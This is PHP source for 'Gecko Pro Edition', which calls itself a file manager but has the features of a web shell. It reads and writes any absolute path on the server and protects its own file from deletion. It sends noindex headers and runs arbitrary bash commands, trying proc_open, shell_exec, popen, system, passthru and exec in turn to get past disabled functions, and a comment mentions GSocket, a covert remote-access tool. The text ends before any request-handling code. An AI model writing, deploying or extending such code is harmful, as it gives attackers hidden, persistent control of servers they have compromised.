<?php
/**
 * Gecko Pro Edition - File Manager
 * Compatible with PHP 5.4 - PHP 8.x
 */

// ───── Polyfills (kompatibilitas lintas versi PHP) ────────────────
if (!function_exists('http_response_code')) {
    // PHP < 5.4 fallback
    function http_response_code($code = null) {
        static $current = 200;
        if ($code !== null) {
            header(' ', true, (int)$code);
            $current = (int)$code;
        }
        return $current;
    }
}

if (!function_exists('str_contains')) {
    // PHP < 8.0 polyfill
    function str_contains($haystack, $needle) {
        return $needle === '' || strpos($haystack, $needle) !== false;
    }
}

if (!defined('JSON_UNESCAPED_UNICODE')) define('JSON_UNESCAPED_UNICODE', 0);
if (!defined('JSON_UNESCAPED_SLASHES')) define('JSON_UNESCAPED_SLASHES', 0);

/**
 * Safe shell-arg quoting — many hosts disable escapeshellarg() via disable_functions.
 * Use geckoEscapeshellarg() everywhere instead of PHP escapeshellarg().
 */
function geckoEscapeshellarg($arg)
{
    $arg = (string)$arg;
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($isWin) {
        // Windows-style: double-quote, strip embedded quotes
        $arg = str_replace('"', '', $arg);
        return '"' . $arg . '"';
    }
    // Unix: single-quote, escape embedded single quotes (same as PHP escapeshellarg)
    return "'" . str_replace("'", "'\\''", $arg) . "'";
}

// ───── Konfigurasi awal ───────────────────────────────────────────
$realBase = realpath(__DIR__);
$baseDir  = $realBase ? $realBase : __DIR__;

// Set upload limits
@ini_set('upload_max_filesize', '100M');
@ini_set('post_max_size', '100M');
@ini_set('max_file_uploads', '20');
@ini_set('memory_limit', '256M');
@ini_set('display_errors', 0); // Matikan display errors agar tidak merusak JSON
error_reporting(E_ALL);

// ───── Authentication (bcrypt) ────────────────────────────────────
// Set false untuk menonaktifkan login (tidak disarankan).
define('GECKO_AUTH_ENABLED', true);
// Default password plaintext: changeme
// Ganti hash: php -r "echo password_hash('password_baru', PASSWORD_BCRYPT);"
define('GECKO_AUTH_HASH', '$2y$10$zoPdtfmWAostiFmyPec3euGghorar24RZO.5Q2WwwMyaI4HrSxGgS');
define('GECKO_AUTH_SESSION_KEY', 'gecko_auth_ok');
define('GECKO_AUTH_MAX_FAILS', 5);
define('GECKO_AUTH_LOCK_SECONDS', 60);

function geckoAuthStart()
{
    if (function_exists('session_status')) {
        if (session_status() === PHP_SESSION_NONE) {
            @session_start();
        }
    } elseif (session_id() === '') {
        @session_start();
    }
}

function geckoAuthIsLoggedIn()
{
    if (!GECKO_AUTH_ENABLED) return true;
    geckoAuthStart();
    return !empty($_SESSION[GECKO_AUTH_SESSION_KEY]);
}

function geckoAuthVerify($password)
{
    if (!function_exists('password_verify')) {
        return false;
    }
    return password_verify((string)$password, GECKO_AUTH_HASH);
}

function geckoAuthLogin($password)
{
    geckoAuthStart();
    $lockUntil = isset($_SESSION['gecko_auth_lock']) ? (int)$_SESSION['gecko_auth_lock'] : 0;
    if ($lockUntil > time()) {
        $wait = $lockUntil - time();
        return array('ok' => false, 'error' => 'Too many attempts. Wait ' . $wait . 's.');
    }
    if (geckoAuthVerify($password)) {
        session_regenerate_id(true);
        $_SESSION[GECKO_AUTH_SESSION_KEY] = 1;
        $_SESSION['gecko_auth_fails'] = 0;
        unset($_SESSION['gecko_auth_lock']);
        return array('ok' => true);
    }
    $fails = isset($_SESSION['gecko_auth_fails']) ? ((int)$_SESSION['gecko_auth_fails'] + 1) : 1;
    $_SESSION['gecko_auth_fails'] = $fails;
    if ($fails >= GECKO_AUTH_MAX_FAILS) {
        $_SESSION['gecko_auth_lock'] = time() + GECKO_AUTH_LOCK_SECONDS;
        $_SESSION['gecko_auth_fails'] = 0;
        return array('ok' => false, 'error' => 'Too many attempts. Locked ' . GECKO_AUTH_LOCK_SECONDS . 's.');
    }
    return array('ok' => false, 'error' => 'Invalid password');
}

function geckoAuthLogout()
{
    geckoAuthStart();
    unset($_SESSION[GECKO_AUTH_SESSION_KEY]);
    $_SESSION['gecko_auth_fails'] = 0;
    unset($_SESSION['gecko_auth_lock']);
}

function geckoAuthShowLogin($error = '')
{
    $errHtml = $error !== '' ? '<div class="login-err">' . htmlspecialchars($error, ENT_QUOTES, 'UTF-8') . '</div>' : '';
    header('Content-Type: text/html; charset=utf-8');
    header('X-Robots-Tag: noindex, nofollow');
    echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">';
    echo '<meta name="robots" content="noindex"><title>Gecko · Login</title>';
    echo '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{min-height:100vh;display:flex;align-items:center;justify-content:center;
font-family:system-ui,-apple-system,sans-serif;color:#f5f1e8;
background:radial-gradient(1200px 600px at 20% -10%,rgba(245,185,66,.12),transparent 55%),
radial-gradient(900px 500px at 100% 100%,rgba(245,185,66,.06),transparent 50%),#050608}
.card{width:min(400px,92vw);padding:28px 26px 24px;border-radius:16px;
background:linear-gradient(180deg,#101216,#0a0b0e);border:1px solid rgba(245,185,66,.22);
box-shadow:0 24px 60px rgba(0,0,0,.55)}
.brand{display:flex;align-items:center;gap:12px;margin-bottom:22px}
.mark{width:40px;height:40px;border-radius:10px;display:grid;place-items:center;
background:rgba(245,185,66,.12);border:1px solid rgba(245,185,66,.35);color:#f5b942;font-weight:700}
h1{font-size:18px;font-weight:650;letter-spacing:.02em}
h1 span{color:#f5b942}
p{margin-top:4px;font-size:12px;color:#8a8578}
label{display:block;font-size:12px;color:#d8d3c4;margin:0 0 8px}
input[type=password]{width:100%;padding:12px 14px;border-radius:10px;border:1px solid rgba(245,185,66,.24);
background:#161920;color:#f5f1e8;font-size:14px;outline:none}
input[type=password]:focus{border-color:rgba(245,185,66,.55);box-shadow:0 0 0 3px rgba(245,185,66,.12)}
button{margin-top:14px;width:100%;padding:12px 14px;border:0;border-radius:10px;cursor:pointer;
background:linear-gradient(180deg,#ffd76e,#f5b942);color:#1a1408;font-weight:700;font-size:14px}
button:hover{filter:brightness(1.05)}
.login-err{margin-bottom:12px;padding:10px 12px;border-radius:8px;font-size:12.5px;
background:rgba(248,113,113,.1);border:1px solid rgba(248,113,113,.28);color:#f87171}
.hint{margin-top:14px;font-size:11px;color:#61605a;text-align:center}
</style></head><body><div class="card">
<div class="brand"><div class="mark">G</div><div><h1>GECKO FM <span>PRO</span></h1><p>Password required · bcrypt protected</p></div></div>
' . $errHtml . '
<form method="post" autocomplete="off">
<label for="gecko_login_pass">Password</label>
<input type="password" id="gecko_login_pass" name="gecko_login_pass" autofocus required>
<button type="submit">Unlock</button>
</form>
<p class="hint">Session auth · password verified with bcrypt</p>
</div></body></html>';
}

function jsonOut($data, $code = 200)
{
    if (!headers_sent()) {
        http_response_code((int)$code);
        header('Content-Type: application/json; charset=utf-8');
    }
    $flags = JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES;
    if (defined('JSON_INVALID_UTF8_SUBSTITUTE')) {
        $flags |= JSON_INVALID_UTF8_SUBSTITUTE;
    } elseif (defined('JSON_PARTIAL_OUTPUT_ON_ERROR')) {
        $flags |= JSON_PARTIAL_OUTPUT_ON_ERROR;
    }
    $json = @json_encode($data, $flags);
    if ($json === false || $json === '') {
        http_response_code(500);
        $json = '{"ok":false,"error":"JSON encode failed"}';
    }
    echo $json;
    exit;
}


function sanitizeRelPath($path)
{
    $path = (string)$path;
    // Decode URL encoded path first
    $path = urldecode($path);

    // Handle Windows paths (C:/, D:/, etc)
    if (preg_match('/^[A-Za-z]:/', $path)) {
        // Normalize slashes
        $path = str_replace('\\', '/', $path);
        // Fix double slashes
        $path = preg_replace('#/+#', '/', $path);
        // Ensure format like C:/path/to/folder
        $path = preg_replace('/^([A-Za-z]:)\/*/', '$1/', $path);
        return $path;
    }

    // Handle absolute Linux paths
    if (strlen($path) > 0 && $path[0] === '/') {
        $path = preg_replace('#/+#', '/', $path);
        return $path;
    }

    // Original relative path logic
    $path = str_replace(array('\\', "\0"), array('/', ''), $path);
    $path = trim($path, '/');
    $parts = array_filter(explode('/', $path), function($p) {
        return $p !== '' && $p !== '.';
    });
    $clean = array();
    foreach ($parts as $part) {
        if ($part === '..') { array_pop($clean); continue; }
        if (preg_match('/[\x00-\x1f]/', $part)) continue;
        $clean[] = $part;
    }
    return implode('/', $clean);
}

function resolvePath($baseDir, $relPath, $mustExist = true)
{
    $rel = sanitizeRelPath($relPath);

    // Handle absolute Windows paths (C:/, D:/, etc)
    if (preg_match('/^[A-Za-z]:\//', $rel)) {
        // Convert to system path
        $full = str_replace('/', DIRECTORY_SEPARATOR, $rel);

        if ($mustExist) {
            $real = realpath($full);
            if ($real !== false) {
                return $real;
            }
            return null;
        } else {
            // Check if parent exists
            $parent = dirname($full);
            if (is_dir($parent) || is_dir($full)) {
                return $full;
            }
            return null;
        }
    }

    // Handle absolute Linux paths
    if (strlen($rel) > 0 && $rel[0] === '/') {
        if ($mustExist) {
            $real = realpath($rel);
            if ($real !== false) {
                return $real;
            }
            return null;
        } else {
            $parent = dirname($rel);
            if (is_dir($parent) || is_dir($rel)) {
                return $rel;
            }
            return null;
        }
    }

    // Handle relative paths
    $full = $rel === '' ? $baseDir : $baseDir . DIRECTORY_SEPARATOR . str_replace('/', DIRECTORY_SEPARATOR, $rel);
    $real = $mustExist ? realpath($full) : (is_file($full) || is_dir($full) ? realpath($full) : null);

    if ($real === false || $real === null) {
        if (!$mustExist) {
            $parent = dirname($full);
            $parentReal = realpath($parent);
            $baseDirNormalized = str_replace('\\', '/', $baseDir);
            $parentRealNormalized = $parentReal ? str_replace('\\', '/', $parentReal) : '';
            if ($parentReal && strpos($parentRealNormalized, $baseDirNormalized) === 0) {
                return $full;
            }
        }
        return null;
    }

    $realNormalized = str_replace('\\', '/', $real);
    $baseDirNormalized = str_replace('\\', '/', $baseDir);
    $starts = strpos($realNormalized, $baseDirNormalized) === 0;
    return $starts ? $real : null;
}

function formatBytes($bytes)
{
    $bytes = (int)$bytes;
    if ($bytes < 1024) return $bytes . ' B';
    $units = array('KB', 'MB', 'GB', 'TB');
    $v = $bytes / 1024;
    foreach ($units as $u) {
        if ($v < 1024) return number_format($v, $v >= 100 ? 0 : 1) . ' ' . $u;
        $v /= 1024;
    }
    return number_format($v, 1) . ' PB';
}

function fmPathsToArray($input)
{
    $paths = _v($input, 'paths', array());
    if (is_string($paths)) {
        $decoded = json_decode($paths, true);
        $paths = is_array($decoded) ? $decoded : array($paths);
    }
    if (!is_array($paths)) $paths = array();
    $out = array();
    foreach ($paths as $p) {
        if ($p === null || $p === '') continue;
        $out[] = (string)$p;
    }
    return $out;
}

function fmIsBlockedPath($path, $baseDir)
{
    $real = @realpath($path);
    if (!$real) return false;
    $self = @realpath(__FILE__);
    $realNorm = str_replace('\\', '/', $real);
    if ($self && $realNorm === str_replace('\\', '/', $self)) return true;
    $baseReal = @realpath($baseDir);
    if ($baseReal && $realNorm === str_replace('\\', '/', $baseReal)) return true;
    if (strpos($realNorm, '/.gecko_quarantine/') !== false) return true;
    return false;
}

function fmDirContainsBlocked($dir, $baseDir)
{
    $dirReal = @realpath($dir);
    if (!$dirReal) return false;
    $dirNorm = str_replace('\\', '/', $dirReal) . '/';
    $self = @realpath(__FILE__);
    if ($self) {
        $selfNorm = str_replace('\\', '/', $self);
        if (strpos($selfNorm . '/', $dirNorm) === 0) return true;
    }
    $baseReal = @realpath($baseDir);
    if ($baseReal) {
        $baseNorm = str_replace('\\', '/', $baseReal);
        if ($baseNorm . '/' === $dirNorm || $baseNorm === rtrim($dirNorm, '/')) return true;
    }
    $items = @scandir($dir);
    if ($items === false) return false;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $sub = $dir . DIRECTORY_SEPARATOR . $item;
        if (fmIsBlockedPath($sub, $baseDir)) return true;
        if (is_dir($sub) && fmDirContainsBlocked($sub, $baseDir)) return true;
    }
    return false;
}

function fmDeleteRecursive($path)
{
    if (is_file($path) || is_link($path)) return @unlink($path);
    if (!is_dir($path)) return false;
    $items = @scandir($path);
    if ($items === false) return false;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        if (!fmDeleteRecursive($path . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return @rmdir($path);
}

function fmCopyRecursive($src, $dest)
{
    if (is_file($src) || is_link($src)) {
        $dir = dirname($dest);
        if (!is_dir($dir) && !@mkdir($dir, 0755, true)) return false;
        return @copy($src, $dest);
    }
    if (!is_dir($src)) return false;
    if (!is_dir($dest) && !@mkdir($dest, 0755, true)) return false;
    $items = @scandir($src);
    if ($items === false) return false;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        if (!fmCopyRecursive($src . DIRECTORY_SEPARATOR . $item, $dest . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return true;
}

function fmUniqueDest($destDir, $basename)
{
    if (!file_exists($destDir . DIRECTORY_SEPARATOR . $basename)) return $basename;
    $name = pathinfo($basename, PATHINFO_FILENAME);
    $ext = pathinfo($basename, PATHINFO_EXTENSION);
    $suffix = $ext !== '' ? '.' . $ext : '';
    for ($i = 1; $i < 1000; $i++) {
        $candidate = $name . ' (' . $i . ')' . $suffix;
        if (!file_exists($destDir . DIRECTORY_SEPARATOR . $candidate)) return $candidate;
    }
    return $name . ' (' . time() . ')' . $suffix;
}

function fmIsSubPath($parent, $child)
{
    $p = str_replace('\\', '/', @realpath($parent));
    $c = str_replace('\\', '/', @realpath($child));
    if (!$p || !$c) return false;
    if ($p === $c) return true;
    return strpos($c . '/', $p . '/') === 0;
}

function fmCopyItems($baseDir, $paths, $destRel)
{
    $destDir = resolvePath($baseDir, $destRel);
    if (!$destDir || !is_dir($destDir)) {
        return array('ok' => false, 'error' => 'Invalid destination folder');
    }
    $copied = array();
    $failed = array();
    foreach ($paths as $rel) {
        $src = resolvePath($baseDir, (string)$rel);
        if (!$src) {
            $failed[] = array('path' => $rel, 'error' => 'Source not found');
            continue;
        }
        if (fmIsBlockedPath($src, $baseDir)) {
            $failed[] = array('path' => $rel, 'error' => 'Protected path');
            continue;
        }
        if (fmIsSubPath($src, $destDir)) {
            $failed[] = array('path' => $rel, 'error' => 'Cannot copy into itself');
            continue;
        }
        $bn = basename($src);
        $targetName = fmUniqueDest($destDir, $bn);
        $dest = $destDir . DIRECTORY_SEPARATOR . $targetName;
        if (fmCopyRecursive($src, $dest)) {
            $copied[] = array('from' => $rel, 'to' => $targetName);
        } else {
            $failed[] = array('path' => $rel, 'error' => 'Copy failed');
        }
    }
    return array(
        'ok' => count($copied) > 0,
        'count' => count($copied),
        'copied' => $copied,
        'failed' => $failed,
        'error' => count($copied) === 0 && count($failed) > 0 ? $failed[0]['error'] : '',
    );
}

function fmMoveItems($baseDir, $paths, $destRel)
{
    $destDir = resolvePath($baseDir, $destRel);
    if (!$destDir || !is_dir($destDir)) {
        return array('ok' => false, 'error' => 'Invalid destination folder');
    }
    $moved = array();
    $failed = array();
    foreach ($paths as $rel) {
        $src = resolvePath($baseDir, (string)$rel);
        if (!$src) {
            $failed[] = array('path' => $rel, 'error' => 'Source not found');
            continue;
        }
        if (fmIsBlockedPath($src, $baseDir)) {
            $failed[] = array('path' => $rel, 'error' => 'Protected path');
            continue;
        }
        if (fmIsSubPath($src, $destDir)) {
            $failed[] = array('path' => $rel, 'error' => 'Cannot move into itself');
            continue;
        }
        $srcParent = dirname($src);
        $bn = basename($src);
        if (str_replace('\\', '/', $srcParent) === str_replace('\\', '/', $destDir)) {
            $failed[] = array('path' => $rel, 'error' => 'Already in destination');
            continue;
        }
        $targetName = fmUniqueDest($destDir, $bn);
        $dest = $destDir . DIRECTORY_SEPARATOR . $targetName;
        $ok = @rename($src, $dest);
        if (!$ok) {
            if (fmCopyRecursive($src, $dest)) {
                $ok = fmDeleteRecursive($src);
            }
            if (!$ok && file_exists($dest)) {
                @fmDeleteRecursive($dest);
            }
        }
        if ($ok) {
            $moved[] = array('from' => $rel, 'to' => $targetName);
        } else {
            $failed[] = array('path' => $rel, 'error' => 'Move failed');
        }
    }
    return array(
        'ok' => count($moved) > 0,
        'count' => count($moved),
        'moved' => $moved,
        'failed' => $failed,
        'error' => count($moved) === 0 && count($failed) > 0 ? $failed[0]['error'] : '',
    );
}

function fmZipAddPath($zip, $path, $prefixInZip)
{
    if (is_file($path)) {
        return $zip->addFile($path, str_replace('\\', '/', $prefixInZip));
    }
    if (!is_dir($path)) return false;
    if ($prefixInZip !== '') $zip->addEmptyDir(str_replace('\\', '/', $prefixInZip));
    $items = @scandir($path);
    if ($items === false) return false;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $sub = $path . DIRECTORY_SEPARATOR . $item;
        $inner = $prefixInZip === '' ? $item : $prefixInZip . '/' . $item;
        if (is_dir($sub)) {
            if (!fmZipAddPath($zip, $sub, $inner)) return false;
        } else {
            if (!$zip->addFile($sub, str_replace('\\', '/', $inner))) return false;
        }
    }
    return true;
}

function fmZipItems($baseDir, $paths, $destRel, $zipName)
{
    if (!class_exists('ZipArchive')) {
        return array('ok' => false, 'error' => 'ZipArchive extension not available on this server');
    }
    $destDir = resolvePath($baseDir, $destRel);
    if (!$destDir || !is_dir($destDir)) {
        return array('ok' => false, 'error' => 'Invalid destination folder');
    }
    $zipName = basename(str_replace('\\', '/', (string)$zipName));
    if ($zipName === '' || !preg_match('/\.zip$/i', $zipName)) {
        $zipName = 'archive-' . date('Ymd-His') . '.zip';
    }
    if (!preg_match('/^[\w\.\-\(\) ]+\.zip$/i', $zipName)) {
        return array('ok' => false, 'error' => 'Invalid zip filename');
    }
    $zipPath = $destDir . DIRECTORY_SEPARATOR . $zipName;
    if (file_exists($zipPath)) {
        $zipName = fmUniqueDest($destDir, $zipName);
        $zipPath = $destDir . DIRECTORY_SEPARATOR . $zipName;
    }
    $zip = new ZipArchive();
    if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
        return array('ok' => false, 'error' => 'Cannot create zip file');
    }
    $added = 0;
    $failed = array();
    foreach ($paths as $rel) {
        $src = resolvePath($baseDir, (string)$rel);
        if (!$src) {
            $failed[] = array('path' => $rel, 'error' => 'Source not found');
            continue;
        }
        if (fmIsBlockedPath($src, $baseDir)) {
            $failed[] = array('path' => $rel, 'error' => 'Protected path');
            continue;
        }
        $rootName = basename($src);
        if (fmZipAddPath($zip, $src, $rootName)) {
            $added++;
        } else {
            $failed[] = array('path' => $rel, 'error' => 'Failed to add to zip');
        }
    }
    $zip->close();
    if ($added === 0) {
        @unlink($zipPath);
        return array('ok' => false, 'error' => 'Nothing added to archive', 'failed' => $failed);
    }
    return array(
        'ok' => true,
        'count' => $added,
        'zip' => $zipName,
        'path' => $zipPath,
        'failed' => $failed,
    );
}

function fmUnzipItem($baseDir, $zipRel, $destRel)
{
    if (!class_exists('ZipArchive')) {
        return array('ok' => false, 'error' => 'ZipArchive extension not available on this server');
    }
    $zipPath = resolvePath($baseDir, (string)$zipRel);
    if (!$zipPath || !is_file($zipPath)) {
        return array('ok' => false, 'error' => 'Zip file not found');
    }
    if (strtolower(pathinfo($zipPath, PATHINFO_EXTENSION)) !== 'zip') {
        return array('ok' => false, 'error' => 'Not a .zip file');
    }
    $destDir = resolvePath($baseDir, $destRel !== '' ? $destRel : dirname(str_replace('\\', '/', $zipRel)));
    if (!$destDir || !is_dir($destDir)) {
        return array('ok' => false, 'error' => 'Invalid destination folder');
    }
    $zip = new ZipArchive();
    if ($zip->open($zipPath) !== true) {
        return array('ok' => false, 'error' => 'Cannot open zip file');
    }
    $destReal = realpath($destDir);
    $destNorm = str_replace('\\', '/', $destReal);
    $numFiles = $zip->numFiles;
    for ($i = 0; $i < $numFiles; $i++) {
        $name = $zip->getNameIndex($i);
        if ($name === false) continue;
        $name = str_replace('\\', '/', $name);
        if ($name === '' || $name[0] === '/' || strpos($name, '../') !== false || strpos($name, '/../') !== false) {
            $zip->close();
            return array('ok' => false, 'error' => 'Unsafe zip entry blocked');
        }
        $target = $destReal . DIRECTORY_SEPARATOR . str_replace('/', DIRECTORY_SEPARATOR, $name);
        $parent = realpath(dirname($target));
        if ($parent === false) {
            $parentNorm = str_replace('\\', '/', dirname($target));
            if (strpos($parentNorm, $destNorm) !== 0 && $parentNorm !== $destNorm) {
                $zip->close();
                return array('ok' => false, 'error' => 'Zip slip detected');
            }
        } else {
            $parentNorm = str_replace('\\', '/', $parent);
            if (strpos($parentNorm, $destNorm) !== 0 && $parentNorm !== $destNorm) {
                $zip->close();
                return array('ok' => false, 'error' => 'Zip slip detected');
            }
        }
    }
    if (!$zip->extractTo($destReal)) {
        $zip->close();
        return array('ok' => false, 'error' => 'Extract failed');
    }
    $zip->close();
    return array('ok' => true, 'count' => $numFiles, 'dest' => $destRel !== '' ? $destRel : dirname(str_replace('\\', '/', $zipRel)));
}

function fileIcon($name, $dir)
{
    if ($dir) return 'folder';
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));

    $iconMap = array(
        'php' => 'php', 'phtml' => 'php',
        'js' => 'js', 'mjs' => 'js', 'ts' => 'js', 'tsx' => 'js', 'jsx' => 'js',
        'css' => 'css', 'scss' => 'css', 'sass' => 'css', 'less' => 'css',
        'html' => 'html', 'htm' => 'html',
        'json' => 'config', 'yaml' => 'config', 'yml' => 'config',
        'xml' => 'config', 'toml' => 'config', 'env' => 'config', 'ini' => 'config',
        'md' => 'text', 'txt' => 'text', 'log' => 'text',
        'png' => 'image', 'jpg' => 'image', 'jpeg' => 'image',
        'gif' => 'image', 'webp' => 'image', 'svg' => 'image', 'ico' => 'image',
        'zip' => 'archive', 'rar' => 'archive', '7z' => 'archive',
        'tar' => 'archive', 'gz' => 'archive',
        'sql' => 'database', 'db' => 'database',
    );

    return isset($iconMap[$ext]) ? $iconMap[$ext] : 'file';
}

function isTextFile($path)
{
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    $text = array('php','phtml','js','mjs','ts','tsx','jsx','css','scss','sass','less','html','htm',
        'json','yaml','yml','xml','toml','env','ini','md','txt','log','sql','htaccess','gitignore','csv');
    if (in_array($ext, $text, true)) return true;
    $size = filesize($path);
    if ($size === false || $size > 512000) return false;
    $fh = fopen($path, 'rb');
    if (!$fh) return false;
    $chunk = fread($fh, 8192); fclose($fh);
    return $chunk !== false && !preg_match('/[\x00-\x08\x0e-\x1f]/', $chunk);
}

function listEntries($dir)
{
    $items = array();
    $h = @opendir($dir);
    if (!$h) return $items;
    while (($name = readdir($h)) !== false) {
        if ($name === '.' || $name === '..') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $name;
        $isDir = is_dir($full);
        $perm = substr(sprintf('%o', fileperms($full)), -4);
        $sz = @filesize($full);
        $mt = @filemtime($full);
        $items[] = array(
            'name' => $name,
            'is_dir' => $isDir,
            'size' => $isDir ? null : (int)($sz ? $sz : 0),
            'modified' => (int)($mt ? $mt : time()),
            'icon' => fileIcon($name, $isDir),
            'perm' => $perm,
            'editable' => !$isDir && isTextFile($full),
        );
    }
    closedir($h);
    usort($items, function ($a, $b) {
        if ($a['is_dir'] !== $b['is_dir']) return $a['is_dir'] ? -1 : 1;
        return strcasecmp($a['name'], $b['name']);
    });
    return $items;
}

/**
 * Run a command by writing it to a temp .sh then: bash /tmp/xxx.sh
 * More reliable than inline complex quoting (needed for GSocket when only proc_open works).
 */
function geckoRunBashScriptFile($scriptBody, $cwd = null, $timeoutSec = 120)
{
    $cwd = $cwd ? $cwd : (isset($GLOBALS['baseDir']) ? $GLOBALS['baseDir'] : sys_get_temp_dir());
    $timeoutSec = max(1, (int)$timeoutSec);
    $tmpDir = function_exists('sys_get_temp_dir') ? sys_get_temp_dir() : '/tmp';
    $tmp = rtrim(str_replace('\\', '/', $tmpDir), '/') . '/.gecko_sh_' . str_replace('.', '', uniqid('', true)) . '.sh';

    $body = "#!/bin/bash\nset +e\n";
    $body .= "cd " . geckoEscapeshellarg($cwd) . " 2>/dev/null || true\n";
    $body .= (string)$scriptBody . "\n";

    if (@file_put_contents($tmp, $body) === false) {
        // fallback write under cwd
        $tmp = rtrim(str_replace('\\', '/', $cwd), '/') . '/.gecko_sh_' . str_replace('.', '', uniqid('', true)) . '.sh';
        if (@file_put_contents($tmp, $body) === false) {
            return array(
                'output' => 'Cannot write temp shell script for execution.',
                'exit_code' => 1,
                'no_shell' => true,
                'method' => '',
            );
        }
    }
    @chmod($tmp, 0700);

    // Simple command — works even when only proc_open is available
    // Prefer argv array (PHP 7.4+) so no outer-shell quoting breaks the path
    $cmd = 'bash ' . geckoEscapeshellarg($tmp);
    $cmdArgv = array('bash', $tmp);
    $result = null;

    // 1) proc_open direct
    if (function_exists('proc_open')) {
        $descriptors = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
        $pipes = array();
        $proc = false;
        // Try argv form first (no shell), then string form, then /bin/bash
        if (defined('PHP_VERSION_ID') && PHP_VERSION_ID >= 70400) {
            $proc = @proc_open($cmdArgv, $descriptors, $pipes, $cwd);
            if (!is_resource($proc)) {
                $pipes = array();
                $proc = @proc_open(array('/bin/bash', $tmp), $descriptors, $pipes, $cwd);
            }
        }
        if (!is_resource($proc)) {
            $pipes = array();
            $proc = @proc_open($cmd, $descriptors, $pipes, $cwd);
        }
        if (!is_resource($proc)) {
            $pipes = array();
            $proc = @proc_open('/bin/bash ' . geckoEscapeshellarg($tmp), $descriptors, $pipes, $cwd);
        }
        if (is_resource($proc)) {
            fclose($pipes[0]);
            stream_set_blocking($pipes[1], false);
            stream_set_blocking($pipes[2], false);
            $stdout = '';
            $stderr = '';
            $deadline = microtime(true) + $timeoutSec;
            while (true) {
                $status = proc_get_status($proc);
                $read = array();
                if (isset($pipes[1]) && is_resource($pipes[1])) $read[] = $pipes[1];
                if (isset($pipes[2]) && is_resource($pipes[2])) $read[] = $pipes[2];
                if (!empty($read)) {
                    $write = null;
                    $except = null;
                    $tv = max(0, min(0.25, $deadline - microtime(true)));
                    if (@stream_select($read, $write, $except, (int)$tv, (int)(($tv - (int)$tv) * 1000000)) > 0) {
                        foreach ($read as $r) {
                            $chunk = fread($r, 8192);
                            if ($chunk === false || $chunk === '') continue;
                            if ($r === $pipes[1]) $stdout .= $chunk;
                            else $stderr .= $chunk;
                        }
                    }
                }
                if (!$status['running']) break;
                if (microtime(true) >= $deadline) {
                    @proc_terminate($proc, 9);
                    break;
                }
                usleep(50000);
            }
            if (isset($pipes[1]) && is_resource($pipes[1])) {
                $rest = stream_get_contents($pipes[1]);
                if ($rest) $stdout .= $rest;
                fclose($pipes[1]);
            }
            if (isset($pipes[2]) && is_resource($pipes[2])) {
                $rest = stream_get_contents($pipes[2]);
                if ($rest) $stderr .= $rest;
                fclose($pipes[2]);
            }
            $code = @proc_close($proc);
            $sep = ($stdout !== '' && $stderr !== '') ? "\n" : '';
            $out = trim($stdout . $sep . $stderr);
            $result = array(
                'output' => ($out !== '' ? $out : (($code === 0) ? '(no output)' : '')),
                'exit_code' => (int)$code,
                'method' => 'proc_open+script',
            );
        }
    }

    // 2) other shell methods with simple "bash /tmp/x.sh"
    if ($result === null) {
        $result = runTerminalFallbackShell($cmd, $cwd, $timeoutSec);
        if (!empty($result['method'])) {
            $result['method'] = $result['method'] . '+script';
        }
    }

    @unlink($tmp);
    return $result;
}

function runTerminalFallbackShell($command, $cwd, $timeoutSec = 120)
{
    $cwd = $cwd ? $cwd : '/tmp';
    $timeoutSec = max(1, (int)$timeoutSec);
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($isWin) {
        $full = 'cd /d ' . geckoEscapeshellarg($cwd) . ' & ' . $command;
    } else {
        $full = 'cd ' . geckoEscapeshellarg($cwd) . ' && ' . $command;
    }

    $tried = array();

    // shell_exec
    if (function_exists('shell_exec')) {
        $tried[] = 'shell_exec';
        $out = @shell_exec($full . ' 2>&1');
        if ($out !== null) {
            return array(
                'output' => is_string($out) ? $out : '',
                'exit_code' => 0,
                'method' => 'shell_exec',
                'tried' => $tried,
            );
        }
        $tried[count($tried) - 1] = 'shell_exec(null)';
    }

    // popen
    if (function_exists('popen') && function_exists('pclose')) {
        $tried[] = 'popen';
        $h = @popen($full . ' 2>&1', 'r');
        if (is_resource($h)) {
            $out = '';
            $deadline = microtime(true) + $timeoutSec;
            while (!feof($h) && microtime(true) < $deadline) {
                $chunk = @fread($h, 8192);
                if ($chunk === false || $chunk === '') {
                    usleep(30000);
                    continue;
                }
                $out .= $chunk;
            }
            $code = @pclose($h);
            return array(
                'output' => trim($out),
                'exit_code' => (int)$code,
                'method' => 'popen',
                'tried' => $tried,
            );
        }
        $tried[count($tried) - 1] = 'popen(fail)';
    }

    // system
    if (function_exists('system')) {
        $tried[] = 'system';
        ob_start();
        $code = 1;
        @system($full . ' 2>&1', $code);
        $out = ob_get_clean();
        return array(
            'output' => is_string($out) ? $out : '',
            'exit_code' => (int)$code,
            'method' => 'system',
            'tried' => $tried,
        );
    }

    // passthru
    if (function_exists('passthru')) {
        $tried[] = 'passthru';
        ob_start();
        $code = 1;
        @passthru($full . ' 2>&1', $code);
        $out = ob_get_clean();
        return array(
            'output' => is_string($out) ? $out : '',
            'exit_code' => (int)$code,
            'method' => 'passthru',
            'tried' => $tried,
        );
    }

    // exec
    if (function_exists('exec')) {
        $tried[] = 'exec';
        $lines = array();
        $code = 1;
        @exec($full . ' 2>&1', $lines, $code);
        return array(
            'output' => implode("\n", $lines),
            'exit_code' => (int)$code,
            'method' => 'exec',
            'tried' => $tried,
        );
    }

    return array(
        'output' => 'No shell runner available. Tried: ' . (count($tried) ? implode(',', $tried) : 'none')
            . ' — enable one of: shell_exec, popen, system, passthru, exec (proc_open disabled).',
        'exit_code' => 1,
        'method' => '',
        'tried' => $tried,
        'no_shell' => true,
    );
}

